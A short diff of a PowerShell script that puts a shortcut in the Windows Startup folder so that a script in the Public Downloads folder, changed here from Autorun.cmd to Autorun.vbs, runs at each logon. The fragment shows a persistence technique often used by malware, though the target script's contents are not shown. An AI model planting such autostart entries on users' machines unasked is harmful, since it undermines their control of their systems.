@@ -1,5 +1,5 @@
-$source = "C:\Users\Public\Downloads\Autorun.cmd"
-$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.cmd.lnk"
+$source = "C:\Users\Public\Downloads\Autorun.vbs"
+$destination = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\Autorun.vbs.lnk"
 $WshShell = New-Object -ComObject WScript.Shell
 $shortcut = $WshShell.CreateShortcut($destination)
 $shortcut.TargetPath = $source
